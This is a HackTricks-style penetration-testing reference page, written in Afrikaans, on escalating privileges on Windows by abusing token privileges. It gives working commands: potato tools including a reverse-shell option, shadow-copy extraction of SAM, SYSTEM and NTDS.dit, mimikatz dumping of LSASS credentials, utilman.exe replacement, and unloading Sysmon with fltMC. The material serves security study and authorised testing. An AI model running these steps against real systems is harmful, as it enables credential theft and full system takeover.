# Misbruik van Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

As jy **nie weet wat Windows Access Tokens is nie**, lees hierdie bladsy voordat jy voortgaan:


{{#ref}}
access-tokens.md
{{#endref}}

**Jy kan dalk voorregte eskaleer deur tokens wat jy reeds het, te misbruik.**

### SeImpersonatePrivilege

Hierdie voorreg laat ’n proses toe om ’n token na te boots (maar nie te skep nie) wanneer dit ’n handle na daardie token kan verkry. ’n Bevoorregte token kan van ’n Windows-diens (DCOM) verkry word deur dit te dwing om NTLM-verifikasie teen ’n exploit uit te voer, waardeur dit daarna moontlik word om ’n proses met SYSTEM-voorregte uit te voer.<sup>[[2]](#references)</sup> Hierdie primitive kan uitgebuit word met nutsmiddels soos [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (wat vereis dat WinRM gedeaktiveer is), [SweetPotato](https://github.com/CCob/SweetPotato) en [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

’n Webtoepassing wat slegs op loopback luister, kan ’n afsonderlike coercion-leidraad wees as ’n plaaslike gebruiker toegang het tot ’n geverifieerde endpoint wat ’n versoek na ’n URL wat deur die oproeper gekies is, onder ’n identiteit met meer voorregte maak. Gaan die endpoint se magtiging en URL-beperkings na, asook die werklike uitgaande kliëntidentiteit en verifikasiegedrag, en of daardie kliënt ’n listener kan bereik wat deur die gebruiker met minder voorregte beheer word. ’n Geaktiveerde `SeImpersonatePrivilege`, ’n IIS-listener of ’n URL-fetch-parameter bewys op sigself nie dat daar ’n bevoorregte token of ’n eskalasiepad is nie. Hou hierdie ondersoek passief; moenie coercion-versoeke stuur tydens enumerasie nie. Sien Microsoft se dokumentasie oor [client impersonation](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) en [IIS application-pool identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities).

Moderne operateursnotas:

- **JuicyPotato is verouderd**: gebruik op Windows 10 1809+/Server 2019+ eerder **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** of **PrintSpoofer**, afhangend van watter RPC/COM-oppervlak steeds bereikbaar is.
- As jy ’n diens wat as **`LOCAL SERVICE`** of **`NETWORK SERVICE`** loop, gekompromitteer het en `whoami /priv` ’n **gefiltreerde token** sonder `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege` wys, herstel eers die rekening se **verstekvoorregtestel** (byvoorbeeld met **FullPowers**) en probeer daarna weer die potato-familie.<sup>[[3]](#references)</sup>
- Sommige nuwer forks is operateursvriendeliker as die oorspronklike nutsmiddels. **SigmaPotato** voeg byvoorbeeld reflection/in-memory-uitvoering en verenigbaarheid met moderne Windows-weergawes by, terwyl **PrintNotifyPotato** die PrintNotify COM-diens misbruik en dikwels nuttig is wanneer die klassieke Spooler-pad gedeaktiveer is.

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Dit is baie soortgelyk aan **SeImpersonatePrivilege**; dit gebruik **dieselfde metode** om ’n bevoorregte token te bekom.\
Hierdie privilege laat jou toe om **’n primêre token aan ’n nuwe/opgeskorte proses toe te wys**. Met die bevoorregte impersonation-token kan jy ’n primêre token aflei (DuplicateTokenEx).\
Met die token kan jy ’n **nuwe proses** met 'CreateProcessAsUser' skep, of ’n proses opgeskort skep en **die token stel** (oor die algemeen kan jy nie die primêre token van ’n lopende proses wysig nie).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

As hierdie token geaktiveer is, kan jy **KERB_S4U_LOGON** gebruik om ’n **impersonation-token** vir enige ander gebruiker te verkry sonder om die credentials te ken, ’n **arbitrêre groep** (admins) by die token te voeg, die **integriteitsvlak** van die token op "**medium**" te stel, en hierdie token aan die **huidige thread** toe te wys (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Hierdie privilege laat die stelsel **leesregte vir alle lêers** verleen (beperk tot leesbewerkings). Dit word gebruik om die **password hashes van plaaslike Administrator-rekeninge** uit die registry te lees. Daarna kan nutsmiddels soos "**psexec**" of "**wmiexec**" met die hash gebruik word (die Pass-the-Hash-tegniek). Hierdie tegniek werk egter nie in twee gevalle nie: wanneer die Local Administrator-rekening gedeaktiveer is, of wanneer ’n beleid administratiewe regte verwyder van Local Administrators wat op afstand koppel.<sup>[[2]](#references)</sup>\
In die praktyk is die betroubaarste ingeboude werksvloei gewoonlik **VSS + `robocopy /b`**: skep/beskikbaar stel ’n shadow copy en kopieer dan `SAM`/`SYSTEM` of `NTDS.dit` in **backup mode**, wat die lêer-ACL’s omseil.<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

Jy kan hierdie **privilege misbruik** met:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- deur **IppSec** te volg in [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Of soos verduidelik in die afdeling **escalating privileges with Backup Operators** van:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Hierdie privilege verskaf **skryftoegang** tot enige stelsellêer, ongeag die lêer se Access Control List (ACL). Dit bied talle eskalasiemoontlikhede, insluitend die vermoë om **services te wysig**, DLL Hijacking uit te voer en **debuggers** via Image File Execution Options in te stel, benewens verskeie ander tegnieke.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege is 'n kragtige permission, veral nuttig wanneer 'n gebruiker tokens kan naboots, maar ook wanneer SeImpersonatePrivilege ontbreek. Hierdie vermoë berus op die vermoë om 'n token na te boots wat dieselfde gebruiker verteenwoordig en waarvan die integrity level nie hoër is as dié van die huidige proses nie.<sup>[[2]](#references)</sup>

**Sleutelpunte:**

- **Nabootsing sonder SeImpersonatePrivilege:** Dit is moontlik om SeCreateTokenPrivilege vir EoP te benut deur tokens onder spesifieke omstandighede na te boots.
- **Voorwaardes vir token-nabootsing:** Suksesvolle nabootsing vereis dat die teikentoken aan dieselfde gebruiker behoort en 'n integrity level het wat laer as of gelyk aan die integrity level van die proses is wat die nabootsing probeer uitvoer.
- **Skep en wysig van impersonation tokens:** Gebruikers kan 'n impersonation token skep en dit uitbrei deur 'n bevoorregte groep se SID (Security Identifier) by te voeg.

### SeLoadDriverPrivilege

Hierdie privilege laat 'n proses toe om **device drivers te laai en te ontlaai** deur 'n registerinskrywing met spesifieke `ImagePath`- en `Type`-waardes te skep. Omdat direkte skryftoegang tot `HKLM` (HKEY_LOCAL_MACHINE) beperk is, kan `HKCU` (HKEY_CURRENT_USER) eerder gebruik word. 'n Spesifieke pad is egter nodig sodat die kernel die `HKCU`-inskrywing as 'n driver-konfigurasie herken.<sup>[[2]](#references)</sup>

Moderne offensiewe gebruik behels gewoonlik **BYOVD** (bring your own vulnerable driver): laai 'n **ondertekende maar kwesbare** kernel driver en gebruik dan sy IOCTLs om beskermings te deaktiveer of kernel-kode-uitvoering te verkry. Hou in gedagte dat die **Microsoft vulnerable driver blocklist** en/of **HVCI/Memory Integrity** op onlangse Windows 11/Server-bouweergawes dikwels ouer openbare chains laat misluk; daarom is klassieke voorbeelde in die styl van `szkg64.sys` nie meer oral betroubaar nie.

Hierdie pad is `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, waar `<RID>` die Relative Identifier van die huidige gebruiker is. Hierdie hele pad moet binne `HKCU` geskep word, en twee waardes moet ingestel word:<sup>[[2]](#references)</sup>

- `ImagePath`, wat die pad is na die binary wat uitgevoer moet word
- `Type`, met die waarde `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Stappe om te volg:**

1. Gebruik `HKCU` in plaas van `HKLM` weens beperkte skryftoegang.
2. Skep die pad `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` binne `HKCU`, waar `<RID>` die huidige gebruiker se Relative Identifier verteenwoordig.
3. Stel `ImagePath` in op die uitvoerpad van die binary.
4. Stel `Type` op `SERVICE_KERNEL_DRIVER` (`0x00000001`).

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

Meer maniere om hierdie voorreg te misbruik in [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Dit is soortgelyk aan **SeRestorePrivilege**. Die primêre funksie daarvan laat ’n proses toe om **eienaarskap van ’n objek oor te neem**, en omseil die vereiste vir eksplisiete diskresionêre toegang deur WRITE_OWNER-toegangsregte toe te staan. Die proses behels dat eienaarskap van die bedoelde registersleutel eers verkry word om dit te kan skryf, waarna die DACL verander word om skryfbewerkings toe te laat.<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

Hierdie privilege laat jou toe om **ander prosesse te debug**, insluitend om geheue te lees en te skryf. Met hierdie privilege kan verskeie strategieë vir memory injection gebruik word wat die meeste antivirus- en host intrusion prevention-oplossings kan ontduik.<sup>[[2]](#references)</sup>

Onthou dat `SeDebugPrivilege` op moderne Windows gewoonlik genoeg is om **nie-beskermde SYSTEM-prosesse** oop te maak en hul tokens te dupliseer, maar dit **waarborg nie** dat jy toegang tot **LSASS** kan kry nie. As **RunAsPPL / LSA Protection** geaktiveer is, kan nie-beskermde prosesse nie in LSASS lees of code inject nie, selfs al is `SeDebugPrivilege` beskikbaar. In daardie geval, steel ’n token van ’n ander nie-PPL SYSTEM-proses, of kombineer dit met ’n PPL bypass/BYOVD eerder as om te aanvaar dat `procdump` sal werk. Vir ’n volledige voorbeeld van token copying met `SeDebugPrivilege` + `SeImpersonatePrivilege`, kyk na [hierdie bladsy](sedebug-+-seimpersonate-copy-token.md).

#### Dump geheue

Jy kan [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) uit die [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) gebruik om **die geheue van ’n proses vas te lê**. Dit kan veral van toepassing wees op die **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**-proses, wat verantwoordelik is om gebruikersbewyse te stoor nadat ’n gebruiker suksesvol by ’n stelsel aangemeld het.

Jy kan hierdie dump dan in mimikatz laai om wagwoorde te bekom:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

'n Voorheen gestoorde, leesbare LSASS-dump kan beskikbaar wees selfs al het die huidige rekening nie toestemming om die aktiewe beskermde proses vas te lê nie. Beskou 'n dump-lêer of 'n argief met 'n soortgelyke naam slegs as 'n leidraad: verifieer toegang en inhoud, en bepaal dan of enige herwonne credential steeds geldig is en toegang tot 'n hoër-bevoorregte konteks verleen. Lêername alleen bewys nie dat 'n argief 'n dump bevat of dat credentials herbruikbaar is nie.

#### RCE

As jy 'n `NT SYSTEM`-shell wil kry, kan jy die volgende gebruik:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

Hierdie reg (Voer volum instandhoudingstake uit) kan bevoorregte volume-bewerkings moontlik maak, maar waarborg nie op sigself ’n leesbare raw-volume handle of arbitrêre lêertoegang nie. Toestel-ACL’s, token-toestand, Windows-weergawe en die aangevraagde bewerking maak steeds saak. ’n Toegelate volumebeheerbewerking kan eerder lêerstelsel-ACL’s verander; dit is ’n muterende bewerking wat moontlik die hele volume raak. Op ’n CA-gasheer vereis sertifika misbruik ook toegang tot bruikbare private-sleutelmateriaal, en EFS-beskermde lêers vereis steeds ’n gemagtigde dekripsie- of herstelsleutel. Sien die gedetailleerde voorvereistes hieronder.<sup>[[5]](#references)</sup>

Sien gedetailleerde tegnieke en versagtingsmaatreëls:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Gaan voorregte na

```
whoami /priv
```

Die **tokens wat as Disabled verskyn** kan gewoonlik geaktiveer word, dus kan jy dikwels beide _Enabled_ en _Disabled_ privileges misbruik.

### Aktiveer al die tokens

As jy gedeaktiveerde privileges het, kan jy die script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) gebruik om al die tokens te aktiveer:

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Of die **script** wat in hierdie [**plasing**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) ingebed is.

## Tabel

Die volledige cheatsheet van tokenvoorregte is by [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin) beskikbaar; die opsomming hieronder lys slegs direkte maniere om die voorreg uit te buit om ’n admin-sessie te verkry of sensitiewe lêers te lees.<sup>[[1]](#references)</sup>

| Voorreg                   | Impak       | Hulpmiddel              | Uitvoeringspad                                                                                                                                                                                                                                                                                                                                     | Opmerkings                                                                                                                                                                                                                                                                                                                     |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | derdepartyhulpmiddel    | _"Dit sal ’n gebruiker in staat stel om tokens na te boots en privesc na nt system te doen met nutsmiddels soos potato.exe, rottenpotato.exe en juicypotato.exe"_                                                                                                                                                                                    | Dankie aan [Aurélien Chalot](https://twitter.com/Defte_) vir die opdatering. Ek sal dit binnekort in iets meer soos ’n resep probeer herformuleer.                                                                                                                                                                           |
| **`SeBackup`**             | **Bedreiging** | _**Ingeboude opdragte**_ | Lees sensitiewe lêers met `robocopy /b` of toegewyde SeBackup-bewuste kopieerhulpmiddels.                                                                                                                                                                                                                                                         | <p>- Uitstekend vir `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` en soms `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` is gerieflik, maar toegewyde SeBackup-cmdlets/API’s is dikwels meer buigsaam vir geslote/oop lêers.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | derdepartyhulpmiddel    | Skep ’n willekeurige token wat plaaslike adminregte insluit met `NtCreateToken`.                                                                                                                                                                                                                                                                   |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Dupliseer ’n **nie-PPL** SYSTEM-token of dump geheue uit ’n nie-beskermde proses.                                                                                                                                                                                                                                                                  | <p>Die dump van LSASS word algemeen geblokkeer as RunAsPPL/LSA Protection geaktiveer is.</p><p>Die script is beskikbaar by [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | derdepartyhulpmiddel    | Gebruik die **Potato-familie** / nabootsing via benoemde pype om SYSTEM te laat loop (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, ens.).                                                                                                                                                                       | <p>Die mees praktiese gebruik is vanaf diensrekeninge soos IIS APPPOOL, MSSQL, geskeduleerde take of enige konteks wat reeds `SeImpersonatePrivilege` besit.</p>                                                                                                                                                               |
| **`SeLoadDriver`**         | _**Admin**_ | derdepartyhulpmiddel    | <p>1. Laai ’n ondertekende, maar kwesbare kernel driver (BYOVD)<br>2. Gebruik die driver se IOCTL’s om kernel R/W te verkry, sekuriteitsnutsmiddels te deaktiveer of na SYSTEM te verhoog<br><br>Alternatiewelik kan die voorreg gebruik word om sekuriteitsverwante drivers met die ingeboude opdrag <code>fltMC</code> te ontlaai, bv. <code>fltMC sysmondrv</code></p> | <p>Ouer publieke drivers soos <code>szkg64.sys</code> word toenemend op moderne Windows deur die kwesbare-driver-blokkeringslys / HVCI geblokkeer.</p>                                                                                                                                                                      |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Begin PowerShell/ISE met die SeRestore-voorreg beskikbaar.<br>2. Aktiveer die voorreg met <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Hernoem utilman.exe na utilman.old<br>4. Hernoem cmd.exe na utilman.exe<br>5. Sluit die konsole en druk Win+U</p> | <p>Die aanval kan deur sommige AV-sagteware opgespoor word.</p><p>’n Alternatiewe metode berus op die vervanging van diensbinaries wat in "Program Files" gestoor is deur dieselfde voorreg te gebruik.</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Ingeboude opdragte**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Hernoem cmd.exe na utilman.exe<br>4. Sluit die konsole en druk Win+U</p>                                                                                                                                       | <p>Die aanval kan deur sommige AV-sagteware opgespoor word.</p><p>’n Alternatiewe metode berus op die vervanging van diensbinaries wat in "Program Files" gestoor is deur dieselfde voorreg te gebruik.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | derdepartyhulpmiddel    | <p>Manipuleer tokens sodat dit plaaslike adminregte insluit. SeImpersonate kan nodig wees.</p><p>Moet nog geverifieer word.</p>                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - uitbuitingspaaie van Windows-voorregte na admin](https://github.com/gtworek/Priv2Admin)
- [2] [Misbruik van tokenvoorregte vir LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Gee my asseblief my voorregte terug!](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b`-rugsteunmodus omseil ACL-kontroles vir lêers/vouers)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Voer volumebestuurstake uit (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → CA-sleutel-uitlek → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
